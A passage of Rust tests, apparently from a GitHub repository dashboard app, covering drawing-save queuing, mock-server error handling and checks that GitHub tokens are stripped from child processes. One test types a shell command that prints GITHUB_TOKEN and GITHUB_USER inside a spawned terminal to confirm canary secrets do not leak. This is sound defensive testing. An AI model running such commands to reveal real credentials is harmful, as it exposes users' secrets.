        assert!(b.elements.is_empty(), "New drawing must not be overwritten by stale load");
        assert_eq!(b.save, Save::Saved);
    }

    #[test]
    fn flushing_during_write_chains_cleanly_without_concurrent_writes() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();
        let id = (full.clone(), branch.clone(), "Drawing1".into());

        // Open drawing as new board.
        s.open_board(0, "Drawing1".into(), true);
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-1".into(), kind: Kind::Rectangle,
            x: 10.0, y: 10.0, w: 20.0, h: 20.0, points: vec![],
            stroke: "#000".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 1,
        });

        // Simulate save_board starting an in-flight write
        assert!(b.save.edit());
        assert_eq!(b.save, Save::Saving { dirty: false });
        s.saving_notes.insert(id.clone(), crate::NoteOp::Save(String::new()));

        // User makes another edit while write 1 is running
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-2".into(), kind: Kind::Ellipse,
            x: 50.0, y: 50.0, w: 30.0, h: 30.0, points: vec![],
            stroke: "#f00".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 2,
        });
        s.save_board();
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });
        // Still only 1 in-flight write, no parallel write started
        assert_eq!(s.saving_notes.len(), 1);
        assert!(s.pending_note_saves.is_empty());

        // User closes drawing while write 1 is in-flight
        s.close_board(0);
        assert!(s.board.is_none(), "board should be closed");
        // flush_board should have queued the pending snapshot instead of starting a concurrent write!
        assert_eq!(s.saving_notes.len(), 1, "never start concurrent writes");
        assert!(s.pending_note_saves.contains_key(&id), "latest snapshot must be queued in pending_note_saves");
        let Some(crate::NoteOp::Save(queued_json)) = s.pending_note_saves.get(&id) else { panic!("a queued save") };
        assert!(queued_json.contains("elem-2"), "queued snapshot contains the latest edits");

        // Write 1 finishes: apply_board_write runs
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        // Queued write is consumed
        assert!(!s.pending_note_saves.contains_key(&id));
    }

    #[test]
    fn reopen_board_with_pending_save_loads_pending_state() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();
        let id = (full.clone(), branch.clone(), "Drawing2".into());

        let pending_json = serde_json::json!({
            "type": "excalidraw", "version": 2,
            "elements": [{
                "id": "pending-rect", "type": "rectangle",
                "x": 100.0, "y": 100.0, "width": 80.0, "height": 40.0,
                "points": [], "strokeColor": "#1e1e1e", "backgroundColor": "transparent",
                "strokeWidth": 2.0, "seed": 10
            }]
        }).to_string();

        s.saving_notes.insert(id.clone(), crate::NoteOp::Save(String::new()));
        s.pending_note_saves.insert(id.clone(), crate::NoteOp::Save(pending_json));

        // Opening the board while a save is pending should load the pending in-memory JSON
        s.open_board(0, "Drawing2".into(), false);
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.elements.len(), 1);
        assert_eq!(b.elements[0].id, "pending-rect");
        assert_eq!(b.save, Save::Saving { dirty: true });
        assert!(!s.pending_note_saves.contains_key(&id));
    }

    #[test]
    fn reopen_board_from_pending_saves_during_in_flight_write_and_edit_again() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();
        let id = (full.clone(), branch.clone(), "ReopenEdit".into());

        // 1. Open drawing as new and add elem-1
        s.open_board(0, "ReopenEdit".into(), true);
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-1".into(), kind: Kind::Rectangle,
            x: 10.0, y: 10.0, w: 20.0, h: 20.0, points: vec![],
            stroke: "#000".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 1,
        });

        // 2. Write 1 starts in-flight (snapshot with elem-1)
        assert!(b.save.edit());
        s.saving_notes.insert(id.clone(), crate::NoteOp::Save(String::new()));

        // 3. User edits elem-2 while write 1 is in flight
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-2".into(), kind: Kind::Ellipse,
            x: 50.0, y: 50.0, w: 30.0, h: 30.0, points: vec![],
            stroke: "#f00".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 2,
        });
        s.save_board();
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });

        // 4. User closes drawing while write 1 is in-flight -> queued in pending_note_saves
        s.close_board(0);
        assert!(s.board.is_none());
        assert!(s.pending_note_saves.contains_key(&id));

        // 5. Re-open drawing while write 1 is STILL in flight
        s.open_board(0, "ReopenEdit".into(), false);
        // It should have removed id from pending_note_saves and set Save::Saving { dirty: true }
        assert!(!s.pending_note_saves.contains_key(&id));
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.elements.len(), 2);
        assert_eq!(b.save, Save::Saving { dirty: true });

        // 6. User adds elem-3 while still in-flight
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-3".into(), kind: Kind::Diamond,
            x: 80.0, y: 80.0, w: 40.0, h: 40.0, points: vec![],
            stroke: "#0f0".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 3,
        });
        s.save_board();
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });

        // 7. Write 1 finishes!
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        // Board is open, so apply_board_write calls written(Ok(())) which returns true and triggers write_board()!
        // b.save becomes Saving { dirty: false }
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.save, Save::Saving { dirty: false });
        // The newly written JSON contains elem-1, elem-2, AND elem-3!
        let json = b.to_json();
        assert!(json.contains("elem-1"));
        assert!(json.contains("elem-2"));
        assert!(json.contains("elem-3"));

        // Write 2 finishes
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saved);
        assert!(s.saving_notes.is_empty());
    }

    #[test]
    fn edit_saved_new_board_while_saving_notes_contains_id_triggers_write() {
        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();
        let id = (full.clone(), branch.clone(), "NewWhileSaving".into());

        // Simulate an old in-flight write (of an empty drawing) for this same drawing name
        let empty = board::Board::new(&full, &branch, "NewWhileSaving").to_json();
        s.saving_notes.insert(id.clone(), crate::NoteOp::Save(empty));

        // User creates new drawing with same name: it opens on the write that is running (its
        // content is the newest one), so the board is Saving, not a blank Saved board.
        s.open_board(0, "NewWhileSaving".into(), true);
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.save, Save::Saving { dirty: false });
        assert!(b.elements.is_empty());

        // User adds an element and triggers save_board()
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "elem-new".into(), kind: Kind::Rectangle,
            x: 10.0, y: 10.0, w: 20.0, h: 20.0, points: vec![],
            stroke: "#000".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 1,
        });
        s.save_board();

        // Because in_flight was true, b.save must be transitioned to Saving { dirty: true }
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });

        // When the old in-flight write completes:
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));

        // It detects dirty: true, calls write_board() with elem-new, and transitions to dirty: false
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.save, Save::Saving { dirty: false });
        let json = b.to_json();
        assert!(json.contains("elem-new"));

        // When write for elem-new completes:
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saved);
        assert!(s.saving_notes.is_empty());
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn flushing_during_write_chains_cleanly_and_persists_newest_content() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let _tmp = TempDataDir::new("fix56-chain-save");

        let mut s = setup_app();
        let (full, branch) = s.notes_branch(0).unwrap();
        let id = (full.clone(), branch.clone(), "E2E".into());

        // 1. Open drawing as new
        s.open_board(0, "E2E".into(), true);
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "shape-1".into(), kind: Kind::Rectangle,
            x: 10.0, y: 10.0, w: 20.0, h: 20.0, points: vec![],
            stroke: "#000".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 1,
        });

        // 2. First write starts in-flight (snapshot 1)
        let json_1 = b.to_json();
        assert!(b.save.edit());
        s.saving_notes.insert(id.clone(), crate::NoteOp::Save(String::new()));

        // 3. User makes newer edits while write 1 is in-flight
        let b = s.board.as_mut().unwrap();
        b.elements.push(Element {
            id: "shape-2".into(), kind: Kind::Line,
            x: 30.0, y: 30.0, w: 40.0, h: 40.0, points: vec![[0.0, 0.0], [40.0, 40.0]],
            stroke: "#f00".into(), fill: None, width: 2.0,
            text: String::new(), font: 20.0, seed: 2,
        });
        s.save_board();
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });

        // 4. User closes drawing while write 1 is in-flight
        s.close_board(0);
        assert!(s.board.is_none(), "board is closed");
        assert_eq!(s.saving_notes.len(), 1, "never start concurrent writes");
        assert!(s.pending_note_saves.contains_key(&id), "queued snapshot must be in pending_note_saves");
        let Some(crate::NoteOp::Save(queued_json)) = s.pending_note_saves.get(&id).cloned() else { panic!("a queued save") };

        // Older write 1 lands on disk first
        pollster::block_on(crate::notes::save(&id.0, &id.1, &id.2, json_1)).unwrap();

        // 5. Write 1 finishes: apply_board_write runs
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        assert!(!s.pending_note_saves.contains_key(&id), "queued write popped");

        // Write 2 lands on disk with the newest content
        pollster::block_on(crate::notes::save(&id.0, &id.1, &id.2, queued_json)).unwrap();
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        assert!(s.saving_notes.is_empty());

        // 6. Verify drawing file on disk has the newest edits (both shape-1 and shape-2)
        let content = pollster::block_on(crate::notes::load(&full, &branch, "E2E")).unwrap().expect("drawing must exist");
        assert!(content.contains("shape-1"), "persisted content contains shape-1");
        assert!(content.contains("shape-2"), "persisted content contains shape-2 (newest edits)");
    }
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod fix50_security_tests {
    use std::ffi::OsString;
    use std::path::{Path, PathBuf};

    struct EnvGuard {
        saved: Vec<(&'static str, Option<OsString>)>,
        temp_dir: Option<PathBuf>,
    }

    impl EnvGuard {
        fn new(vars: &[&'static str]) -> Self {
            let saved = vars.iter().map(|&k| (k, std::env::var_os(k))).collect();
            Self {
                saved,
                temp_dir: None,
            }
        }
    }

    impl Drop for EnvGuard {
        fn drop(&mut self) {
            unsafe {
                for (k, v) in &self.saved {
                    match v {
                        Some(val) => std::env::set_var(k, val),
                        None => std::env::remove_var(k),
                    }
                }
            }
            if let Some(dir) = &self.temp_dir {
                let _ = std::fs::remove_dir_all(dir);
            }
        }
    }

    #[test]
    fn child_commands_strip_github_token_and_user_even_when_present_in_parent_env() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut guard = EnvGuard::new(&["GITHUB_TOKEN", "GITHUB_USER"]);

        let temp_dir = std::env::temp_dir().join(format!("repohub-test-child-strip-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&temp_dir);
        std::fs::create_dir_all(&temp_dir).unwrap();
        guard.temp_dir = Some(temp_dir.clone());

        // Set GITHUB_TOKEN and GITHUB_USER in the parent process environment.
        unsafe {
            std::env::set_var("GITHUB_TOKEN", "parent_secret_token_123");
            std::env::set_var("GITHUB_USER", "parent_user_456");
        }

        // 1. git Command (local::git_command)
        let git_cmd = crate::local::git_command(&temp_dir, &["status"]);
        let git_envs: Vec<_> = git_cmd.get_envs().collect();
        assert!(
            git_envs.iter().any(|(k, v)| *k == "GITHUB_TOKEN" && v.is_none()),
            "git command must explicitly remove GITHUB_TOKEN (found {git_envs:?})"
        );
        assert!(
            git_envs.iter().any(|(k, v)| *k == "GITHUB_USER" && v.is_none()),
            "git command must explicitly remove GITHUB_USER (found {git_envs:?})"
        );

        // 2. Claude Code Command (claude::command)
        let claude_cmd = crate::claude::command(&["--version".into()]);
        let claude_envs: Vec<_> = claude_cmd.get_envs().collect();
        assert!(
            claude_envs.iter().any(|(k, v)| *k == "GITHUB_TOKEN" && v.is_none()),
            "claude command must explicitly remove GITHUB_TOKEN (found {claude_envs:?})"
        );
        assert!(
            claude_envs.iter().any(|(k, v)| *k == "GITHUB_USER" && v.is_none()),
            "claude command must explicitly remove GITHUB_USER (found {claude_envs:?})"
        );

        // 3. Plugins clone command (plugins::clone_command)
        let clone_cmd = crate::plugins::clone_command("https://example.com/repo.git", &temp_dir.join("dest"));
        let clone_envs: Vec<_> = clone_cmd.get_envs().collect();
        assert!(
            clone_envs.iter().any(|(k, v)| *k == "GITHUB_TOKEN" && v.is_none()),
            "plugins clone command must explicitly remove GITHUB_TOKEN (found {clone_envs:?})"
        );
        assert!(
            clone_envs.iter().any(|(k, v)| *k == "GITHUB_USER" && v.is_none()),
            "plugins clone command must explicitly remove GITHUB_USER (found {clone_envs:?})"
        );

        // 4. Terminal CommandBuilder (terminal::shell)
        let term_cmd = crate::terminal::shell();
        assert_eq!(
            term_cmd.get_env("GITHUB_TOKEN"),
            None,
            "terminal shell must not contain GITHUB_TOKEN in its environment builder"
        );
        assert_eq!(
            term_cmd.get_env("GITHUB_USER"),
            None,
            "terminal shell must not contain GITHUB_USER in its environment builder"
        );
    }

    #[cfg(unix)]
    #[test]
    fn spawned_terminal_child_process_does_not_have_github_token_in_env() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut guard = EnvGuard::new(&["GITHUB_TOKEN", "GITHUB_USER"]);

        let temp_dir = std::env::temp_dir().join(format!("repohub-test-term-child-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&temp_dir);
        std::fs::create_dir_all(&temp_dir).unwrap();
        guard.temp_dir = Some(temp_dir.clone());

        unsafe {
            std::env::set_var("GITHUB_TOKEN", "leak_canary_token_xyz999");
            std::env::set_var("GITHUB_USER", "leak_canary_user_abc888");
        }

        // Spawn a real terminal using default settings (opt-in is false/None)
        let mut term = crate::terminal::Term::spawn(&temp_dir, 24, 80, None, || {}).expect("shell starts");
        // Print the environment variables inside the terminal shell. Use a split string for the sentinel
        // so the PTY's input echo does not contain "FINISHED" before the shell executes the command.
        term.write(b"printf 'TOK=[%s] USR=[%s] %s\\n' \"$GITHUB_TOKEN\" \"$GITHUB_USER\" \"FIN\"\"ISHED\"\r");

        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        let mut output = String::new();
        while std::time::Instant::now() < deadline {
            output = term.text();
            if output.contains("FINISHED") {
                break;
            }
            std::thread::sleep(std::time::Duration::from_millis(50));
        }

        assert!(output.contains("FINISHED"), "terminal output should reach sentinel (got: {output})");
        assert!(output.contains("TOK=[]"), "GITHUB_TOKEN must be empty in terminal shell output (got: {output})");
        assert!(output.contains("USR=[]"), "GITHUB_USER must be empty in terminal shell output (got: {output})");
        assert!(!output.contains("leak_canary_token_xyz999"));
        assert!(!output.contains("leak_canary_user_abc888"));
    }

    #[test]
    fn signing_out_takes_effect_immediately_for_new_children_and_clears_process_env() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut guard = EnvGuard::new(&[
            "GITHUB_TOKEN",
            "GITHUB_USER",
            "REPOHUB_DATA_DIR",
            "REPOHUB_TERMINAL_PASS_TOKEN",
        ]);

        let temp_dir = std::env::temp_dir().join(format!("repohub-test-signout-child-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&temp_dir);
        let data_dir = temp_dir.join("data");
        std::fs::create_dir_all(&data_dir).unwrap();
        guard.temp_dir = Some(temp_dir);

        unsafe { std::env::set_var("REPOHUB_DATA_DIR", &data_dir) };

        let mut app = crate::init();
        let mut cfg = (*app.cfg).clone();
        cfg.account_locked = false;
        cfg.user = Some("signed_in_user".into());
        cfg.token = Some("signed_in_token_777".into());
        cfg.terminal_pass_token = true; // explicitly opted-in
        app.cfg = std::sync::Arc::new(cfg);

        // Pre-condition: opt-in enabled with active account -> term token would be passed
        let active_term_token = if app.cfg.terminal_pass_token { app.cfg.token.as_deref() } else { None };
        assert_eq!(active_term_token, Some("signed_in_token_777"));

        // User signs out via Settings
        app.save_account(true);

        // 1. Process environment must have NO GITHUB_TOKEN or GITHUB_USER
        assert!(std::env::var("GITHUB_TOKEN").is_err(), "GITHUB_TOKEN must not linger in process env after sign-out");
        assert!(std::env::var("GITHUB_USER").is_err(), "GITHUB_USER must not linger in process env after sign-out");

        // 2. Config has no token or user
        assert_eq!(app.cfg.token, None);
        assert_eq!(app.cfg.user, None);

        // 3. New terminal spawn immediately gets None for token, even if terminal_pass_token was true
        let term_token_after_sign_out = if app.cfg.terminal_pass_token { app.cfg.token.as_deref() } else { None };
        assert_eq!(term_token_after_sign_out, None, "sign-out must clear terminal token immediately");

        // 4. Newly built child commands for git, claude, plugins have NO token
        let git_cmd = crate::local::git_command(Path::new("."), &["status"]);
        let git_envs: Vec<_> = git_cmd.get_envs().collect();
        assert!(git_envs.iter().any(|(k, v)| *k == "GITHUB_TOKEN" && v.is_none()));
        assert!(git_envs.iter().any(|(k, v)| *k == "GITHUB_USER" && v.is_none()));
    }
}




#[cfg(test)]
mod fix83_tests {
    use super::*;
    use crate::board::{Element, Kind};
    use crate::state::Save;

    fn app() -> App {
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.data.repos[0].full_name = "owner/repo".into();
        s.data.repos[0].branch = "main".into();
        // With an account in the environment, `init` waits to reopen the place saved last time
        // (by another test, here): these tests start from the page they set.
        s.pending_place = None;
        s
    }

    /// A drawing's JSON with one rectangle called `tag`.
    fn drawing(tag: &str) -> String {
        let mut b = board::Board::new("owner/repo", "main", "x");
        b.elements.push(Element {
            id: tag.into(), kind: Kind::Rectangle, x: 1.0, y: 1.0, w: 10.0, h: 10.0, points: vec![],
            stroke: "#000".into(), fill: None, width: 2.0, text: String::new(), font: 20.0, seed: 1,
        });
        b.to_json()
    }

    fn id(s: &App, name: &str) -> (String, String, String) {
        let (full, branch) = s.notes_branch(0).unwrap();
        (full, branch, name.into())
    }

    #[test]
    fn reopening_during_a_clean_write_shows_what_is_being_written() {
        let mut s = app();
        let id = id(&s, "Arch");
        // A write of the newest content is running, nothing queued behind it (the board was
        // closed while Saving { dirty: false }).
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("newest")));
        s.open_board(0, "Arch".into(), false);
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.save, Save::Saving { dirty: false }, "not Loading from the older file");
        assert!(b.to_json().contains("newest"));
        // The write finishes: the board is Saved, with the same content.
        s.apply_note_op(s.load_gen, id, Ok(()));
        let b = s.board.as_ref().unwrap();
        assert_eq!(b.save, Save::Saved);
        assert!(b.to_json().contains("newest"));
    }

    #[test]
    fn new_with_the_same_name_keeps_the_queued_edits() {
        let mut s = app();
        let id = id(&s, "Plan");
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("first")));
        s.pending_note_saves.insert(id.clone(), NoteOp::Save(drawing("second")));
        // The list doesn't show "Plan" yet, so the user types it again and presses New.
        s.open_board(0, "Plan".into(), true);
        let b = s.board.as_ref().unwrap();
        assert!(b.to_json().contains("second"), "opened on the newest snapshot, not a blank board");
        assert_eq!(b.save, Save::Saving { dirty: true }, "the snapshot is written after the running write");
        assert!(!s.pending_note_saves.contains_key(&id));
        // The running write ends; the open board's newest content is written next (no handle in
        // tests, so the write isn't sent, but the board moves on to writing it).
        s.apply_note_op(s.load_gen, id, Ok(()));
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: false });
        assert_eq!(s.note_log, [format!("save Plan: {}", s.board.as_ref().unwrap().to_json().len())]);
    }

    #[cfg(not(target_arch = "wasm32"))]
    #[test]
    fn an_account_switch_keeps_queued_drawing_writes() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = app();
        let id = id(&s, "Arch");
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("first")));
        s.pending_note_saves.insert(id.clone(), NoteOp::Save(drawing("second")));
        let before = s.load_gen;
        s.reset_account_state();
        assert!(s.load_gen != before);
        assert!(s.saving_notes.contains_key(&id) && s.pending_note_saves.contains_key(&id), "nothing is dropped");
        // The old write's result arrives after the switch: the queued snapshot is still written.
        s.apply_note_op(before, id.clone(), Ok(()));
        assert!(!s.pending_note_saves.contains_key(&id));
        assert_eq!(s.note_log, [format!("save Arch: {}", drawing("second").len())], "the queued snapshot was written");
    }

    #[test]
    fn deleting_during_a_write_waits_for_it_and_wins() {
        let mut s = app();
        let id = id(&s, "Old");
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("first")));
        s.pending_note_saves.insert(id.clone(), NoteOp::Save(drawing("second")));
        s.delete_note(0, "Old".into());
        assert_eq!(s.pending_note_saves.get(&id), Some(&NoteOp::Delete), "the queued save is replaced by the delete");
        // The running write finishes: the delete runs next and nothing writes the drawing again.
        s.apply_note_op(s.load_gen, id.clone(), Ok(()));
        assert!(!s.pending_note_saves.contains_key(&id));
        assert_eq!(s.note_log, ["delete Old"], "only the delete runs, no write of the old snapshot");
    }

    #[test]
    fn drawing_while_it_is_being_deleted_is_written_after_the_delete() {
        let mut s = app();
        let id = id(&s, "Old");
        s.saving_notes.insert(id.clone(), NoteOp::Delete);
        s.open_board(0, "Old".into(), true);
        assert!(s.board.as_ref().unwrap().elements.is_empty(), "opens empty");
        let mut d = board::Board::new("owner/repo", "main", "x");
        d.load_json(&drawing("new")).unwrap();
        s.board.as_mut().unwrap().elements.push(d.elements.remove(0));
        s.save_board();
        assert!(s.note_log.is_empty(), "nothing is written alongside the running delete");
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: true });
        s.apply_note_op(s.load_gen, id, Ok(()));
        assert_eq!(s.note_log.len(), 1);
        assert!(s.note_log[0].starts_with("save Old"), "the new drawing is written once the delete ends");
        assert_eq!(s.board.as_ref().unwrap().save, Save::Saving { dirty: false });
    }

    #[test]
    fn reopening_says_a_queued_delete_is_cancelled() {
        let mut s = app();
        let id = id(&s, "Old");
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("first")));
        s.pending_note_saves.insert(id.clone(), NoteOp::Delete);
        s.open_board(0, "Old".into(), false);
        assert!(s.toast.as_ref().is_some_and(|t| t.text.contains("won't be deleted")));
        s.apply_note_op(s.load_gen, id, Ok(()));
        assert!(s.note_log.iter().all(|l| !l.starts_with("delete")));
    }

    #[test]
    fn a_failed_write_on_the_open_drawing_shows_once() {
        let mut s = app();
        let id = id(&s, "Arch");
        s.open_board(0, "Arch".into(), true);
        s.board.as_mut().unwrap().save = Save::Saving { dirty: false };
        s.saving_notes.insert(id.clone(), NoteOp::Save(drawing("x")));
        s.apply_note_op(s.load_gen, id, Err("disk full".into()));
        assert!(matches!(s.board.as_ref().unwrap().save, Save::Failed(_)));
        assert!(s.toast.is_none(), "the board shows the failure; no toast on top");
    }

    #[test]
    fn a_merge_confirmation_closes_with_its_diff() {
        let mut s = app();
        s.open_pull_diff("owner/repo".into(), 14);
        s.confirm_merge = Some(crate::actions::busy_key("owner/repo", 14));
        s.open_pull_diff("owner/repo".into(), 9);
        assert_eq!(s.confirm_merge, None, "another diff: the old question goes");
        s.confirm_merge = Some(crate::actions::busy_key("owner/repo", 9));
        s.close_pull_diff();
        assert_eq!(s.confirm_merge, None);
    }

    #[test]
    fn the_page_keeps_the_name_as_github_spells_it_now() {
        let mut s = app();
        s.page = Page::Repo("OWNER/repo".into());
        let mut next = s.data.clone();
        next.repos[0].full_name = "owner/repo".into();
        let epoch = s.load_gen;
        s.apply(epoch, Ok(next));
        assert_eq!(s.page, Page::Repo("owner/repo".into()));
    }

    #[test]
    fn toggle_star_respects_allow_writes() {
        let mut s = app();
        let mut cfg = (*s.cfg).clone();
        cfg.allow_writes = false;
        s.cfg = std::sync::Arc::new(cfg);

        let initial_starred = s.data.repos[0].starred;
        let initial_stars = s.data.repos[0].stars;

        s.toggle_star(0);

        assert_eq!(s.data.repos[0].starred, initial_starred, "starred status must not change");
        assert_eq!(s.data.repos[0].stars, initial_stars, "star count must not change");
        assert!(s.toast.as_ref().is_some_and(|t| t.text.contains("Writes are disabled on this server")));
    }
}

#[cfg(test)]
mod fix58_tests {
    use super::*;
    use crate::net::Resp;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};

    struct MockServer {
        port: u16,
        running: Arc<AtomicBool>,
        handle: Option<std::thread::JoinHandle<()>>,
    }

    impl MockServer {
        fn new(handler: impl Fn(&str, &str) -> (u16, Vec<(&'static str, &'static str)>, String) + Send + Sync + 'static) -> Self {
            let listener = TcpListener::bind("127.0.0.1:0").unwrap();
            let port = listener.local_addr().unwrap().port();
            let running = Arc::new(AtomicBool::new(true));
            let r = running.clone();
            let handler = Arc::new(handler);
            listener.set_nonblocking(true).unwrap();

            let handle = std::thread::spawn(move || {
                while r.load(Ordering::Relaxed) {
                    match listener.accept() {
                        Ok((mut stream, _)) => {
                            let mut buf = [0u8; 4096];
                            let mut n = 0;
                            while n < buf.len() {
                                match stream.read(&mut buf[n..]) {
                                    Ok(0) => break,
                                    Ok(bytes) => {
                                        n += bytes;
                                        if buf[..n].windows(4).any(|w| w == b"\r\n\r\n") {
                                            break;
                                        }
                                    }
                                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                        std::thread::sleep(std::time::Duration::from_millis(5));
                                    }
                                    Err(_) => break,
                                }
                            }
                            let req_str = String::from_utf8_lossy(&buf[..n]);
                            let mut lines = req_str.lines();
                            let req_line = lines.next().unwrap_or("");
                            let mut parts = req_line.split_whitespace();
                            let method = parts.next().unwrap_or("GET");
                            let path = parts.next().unwrap_or("/");

                            let (status, headers, body) = handler(method, path);
                            let reason = match status {
                                200 => "OK",
                                403 => "Forbidden",
                                404 => "Not Found",
                                429 => "Too Many Requests",
                                500 => "Internal Server Error",
                                _ => "Status",
                            };
                            let mut resp = format!("HTTP/1.1 {status} {reason}\r\nContent-Length: {}\r\nConnection: close\r\n", body.len());
                            for (k, v) in headers {
                                resp.push_str(&format!("{k}: {v}\r\n"));
                            }
                            resp.push_str("\r\n");
                            resp.push_str(&body);
                            let _ = stream.write_all(resp.as_bytes());
                            let _ = stream.flush();
                        }
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                            std::thread::sleep(std::time::Duration::from_millis(10));
                        }
                        Err(_) => break,
                    }
                }
            });

            MockServer { port, running, handle: Some(handle) }
        }

        fn url(&self) -> String {
            format!("http://127.0.0.1:{}", self.port)
        }
    }

    impl Drop for MockServer {
        fn drop(&mut self) {
            self.running.store(false, Ordering::Relaxed);
            if let Some(h) = self.handle.take() {
                let _ = h.join();
            }
        }
    }

    #[test]
    fn detail_with_error_not_kept_after_refresh_and_readme_404_vs_500() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());

        // 1. Mock HTTP: verify README 404 vs 500 and contents failure
        let server = MockServer::new(|_method, path| {
            if path.contains("/contents") {
                (500, vec![("Content-Type", "application/json")], r#"{"message":"Server error loading files"}"#.into())
            } else if path.contains("/readme") {
                if path.contains("404-repo") {
                    (404, vec![("Content-Type", "application/json")], r#"{"message":"Not Found"}"#.into())
                } else {
                    (500, vec![("Content-Type", "application/json")], r#"{"message":"Internal Server Error"}"#.into())
                }
            } else {
                (200, vec![("Content-Type", "application/json")], "[]".into())
            }
        });

        let mut cfg = Config::from_json("{}").unwrap();
        cfg.api = server.url();
        cfg.token = Some("mock_tok".into());
        let gh = crate::github::Gh::new(&cfg);

        // README 404 returns Ok(None) -> detail has readme: None and readme_error: None
        let d_404 = pollster::block_on(gh.detail("user/404-repo", "main"));
        assert!(d_404.readme.is_none());
        assert!(d_404.readme_error.is_none());

        // README 500 returns Err -> detail has readme_error: Some(...)
        let d_500 = pollster::block_on(gh.detail("user/500-repo", "main"));
        assert!(d_500.readme.is_none());
        assert!(d_500.readme_error.is_some());

        // Contents 500 returns Err -> detail has error: Some(...)
        assert!(d_404.error.is_some());
        assert!(d_500.error.is_some());

        // 2. apply_detail: contents failed and nothing else loaded -> stores Load::Failed
        let mut app = crate::init();
        let key_failed = ("user/failed-repo".into(), "main".into());
        let d_all_failed = Detail {
            error: Some("Failed to load contents".into()),
            ..Detail::default()
        };
        app.apply_detail(app.load_gen, key_failed.clone(), d_all_failed);
        assert!(matches!(app.details.get(&key_failed), Some(Load::Failed(_))));

        // When partial data is loaded, stores Load::Ready with error visible
        let key_partial = ("user/partial-repo".into(), "main".into());
        let d_partial = Detail {
            error: Some("Partial error".into()),
            files: vec![("file.txt".into(), false)],
            ..Detail::default()
        };
        app.apply_detail(app.load_gen, key_partial.clone(), d_partial);
        assert!(matches!(app.details.get(&key_partial), Some(Load::Ready(_))));

        // 3. Cache persistence across refresh:
        // - Error-free detail for an unpushed repo IS kept
        // - Detail with an error (d.error or d.readme_error) is NOT kept
        // - Load::Failed is NOT kept
        let mut s = crate::init();
        let mut s_cfg = (*s.cfg).clone();
        s_cfg.token = Some("tok".into());
        s.cfg = std::sync::Arc::new(s_cfg);
        s.data = model::Data::sample_at(1_700_000_000);
        s.data.sample = false;
        let unpushed = s.data.repos[0].full_name.clone();
        let errored = s.data.repos[1].full_name.clone();
        let readme_errored = s.data.repos[2].full_name.clone();

        s.details.insert((unpushed.clone(), "main".into()), Load::Ready(Detail::default()));
        s.details.insert((errored.clone(), "main".into()), Load::Ready(Detail {
            error: Some("Failed".into()),
            ..Detail::default()
        }));
        s.details.insert((readme_errored.clone(), "main".into()), Load::Ready(Detail {
            readme_error: Some("Failed README".into()),
            ..Detail::default()
        }));
        s.details.insert(("user/load-failed".into(), "main".into()), Load::Failed("network error".into()));

